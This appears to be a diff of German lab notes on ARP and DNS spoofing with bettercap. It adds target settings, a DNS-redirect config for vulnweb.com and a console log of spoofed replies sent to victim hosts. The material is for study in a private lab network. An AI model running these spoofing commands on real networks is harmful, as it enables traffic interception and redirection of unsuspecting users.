@@ -32,9 +32,10 @@ net.show
 active
  
 set arp.spoof.fullduplex true
-set arp.spoof.targets 192.168.226.138
+set arp.spoof.targets 192.168.7.53
 arp.spoof on
 
+set net.sniff.filter host 192.168.7.53
 net.sniff on
 ```
 
@@ -158,8 +159,9 @@ MAC (Attacker) --> MAC (Router)
 
 # Versuche im Labornetz
 
-Bridged
+## Bridged Variante 1
 
+2 Kali Systeme auf dem gleichen Rechner
 
 
 ```
@@ -204,3 +206,65 @@ net.sniff on
 ```
 
 Auch in diesem Fall sieht der Attacker alle Pakete auch wenn ARP Spoofing nicht aktiv ist. Wahrscheinlich ist die VmWare Bridge einfach ein Hub.
+
+## Bridged Variante 2
+
+2 Kali Systeme auf unterschiedlichen Rechnern. Umstecken eines PCs in ein anderes Labornetz.
+
+Ohne ARP Spoofing sieht man den Traffic des Victim Rechners nicht.
+
+Mit Spoofing schon.
+
+
+# DNS Spoofing
+
+Konfigurationsfile:
+
+```
+$ cat bettercap.dns                
+# Domain | IP-Adresse für Umleitung
+vulnweb.com 192.168.7.54
+```
+
+```
+net.probe on
+  
+set arp.spoof.fullduplex true
+set arp.spoof.targets 192.168.7.53
+arp.spoof on
+
+set dns.spoof.domains vulnweb.com
+set dns.spoof.address 192.168.7.54
+dns.spoof on
+```
+
+
+set dns.spoof.hosts bettercap.dns
+
+
+```
+192.168.7.0/24 > 192.168.7.54  » [08:39:04] [sys.log] [inf] gateway monitor started ...
+192.168.7.0/24 > 192.168.7.54  » net.probe on
+192.168.7.0/24 > 192.168.7.54  »   
+192.168.7.0/24 > 192.168.7.54  » set arp.spoof.fullduplex true
+192.168.7.0/24 > 192.168.7.54  » [08:39:05] [sys.log] [inf] net.probe starting net.recon as a requirement for net.probe
+[08:39:05] [sys.log] [inf] net.probe probing 256 addresses on 192.168.7.0/24
+192.168.7.0/24 > 192.168.7.54  » set arp.spoof.targets 192.168.7.53
+192.168.7.0/24 > 192.168.7.54  » arp.spoof on
+192.168.7.0/24 > 192.168.7.54  » [08:39:05] [sys.log] [war] arp.spoof full duplex spoofing enabled, if the router has ARP spoofing mechanisms, the attack will fail.
+192.168.7.0/24 > 192.168.7.54  » 
+192.168.7.0/24 > 192.168.7.54  » set dns.spoof.domains vulnweb.com
+192.168.7.0/24 > 192.168.7.54  » [08:39:05] [sys.log] [inf] arp.spoof arp spoofer started, probing 1 targets.
+192.168.7.0/24 > 192.168.7.54  » set dns.spoof.address 192.168.7.54
+[08:39:05] [endpoint.new] endpoint 192.168.7.53 detected as 00:0c:29:1f:53:19 (VMware, Inc.).
+192.168.7.0/24 > 192.168.7.54  » dns.spoof o[08:39:05] [endpoint.new] endpoint 192.168.7.55 detected as 60:a4:b7:75:7a:7f (TP-Link Corporation Limited).
+192.168.7.0/24 > 192.168.7.54  » dns.spoof o[08:39:05] [endpoint.new] endpoint 192.168.7.50 detected as c0:06:c3:38:16:1b (TP-Link Corporation Limited).
+192.168.7.0/24 > 192.168.7.54  » dns.spoof on
+[08:39:27] [sys.log] [inf] dns.spoof vulnweb.com -> 192.168.7.54
+192.168.7.0/24 > 192.168.7.54  » [08:39:45] [sys.log] [inf] dns.spoof sending spoofed DNS reply for vulnweb.com (->192.168.7.54) to 192.168.7.254 : 1c:df:0f:ca:41:01 (Cisco Systems, Inc).
+192.168.7.0/24 > 192.168.7.54  » [08:39:45] [sys.log] [inf] dns.spoof sending spoofed DNS reply for vulnweb.com (->192.168.7.54) to 192.168.7.53 : 00:0c:29:1f:53:19 (VMware, Inc.).
+192.168.7.0/24 > 192.168.7.54  » [08:39:45] [sys.log] [inf] dns.spoof sending spoofed DNS reply for vulnweb.com (->192.168.7.54) to 192.168.7.53 : 00:0c:29:1f:53:19 (VMware, Inc.).
+192.168.7.0/24 > 192.168.7.54  » [08:39:46] [sys.log] [inf] dns.spoof sending spoofed DNS reply for testhtml5.vulnweb.com (->192.168.7.54) to 192.168.7.53 : 00:0c:29:1f:53:19 (VMware, Inc.).
+192.168.7.0/24 > 192.168.7.54  » [08:39:46] [sys.log] [inf] dns.spoof sending spoofed DNS reply for testhtml5.vulnweb.com (->192.168.7.54) to 192.168.7.53 : 00:0c:29:1f:53:19 (VMware, Inc.).
+192.168.7.0/24 > 192.168.7.54  » [08:39:46] [sys.log] [inf] dns.spoof sending spoofed DNS reply for testhtml5.vulnweb.com (->192.168.7.54) to 192.168.7.254 : 1c:df:0f:ca:41:01 (Cisco Systems, Inc).
+```
